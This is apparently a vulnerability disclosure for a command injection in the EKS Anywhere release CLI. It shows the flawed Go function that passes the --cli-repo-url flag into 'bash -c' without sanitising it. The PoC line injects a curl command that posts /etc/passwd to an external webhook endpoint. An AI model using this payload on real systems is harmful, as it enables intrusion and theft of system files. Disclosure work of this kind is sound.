# EKS Anywhere Release CLI - Command Injection PoC

## Vulnerability
Shell command injection in `release/cli/pkg/git/git.go` via `--cli-repo-url` flag.

## Affected Code
```go
func CloneRepo(cloneUrl, destination string) (string, error) {
    cloneRepoCommandSequence := fmt.Sprintf("git clone --depth 1 %s %[2]s; ...", cloneUrl, destination)
    cmd := exec.Command("bash", "-c", cloneRepoCommandSequence)
    return commandutils.ExecCommand(cmd)
}
```

## Exploit
The `--cli-repo-url` parameter is passed directly to a shell command without sanitization.

## PoC
```bash
./release-cli release --cli-repo-url "http://x; curl -d @/etc/passwd https://webhook.site/YOUR_ID #" --build-repo-url "http://x"
```
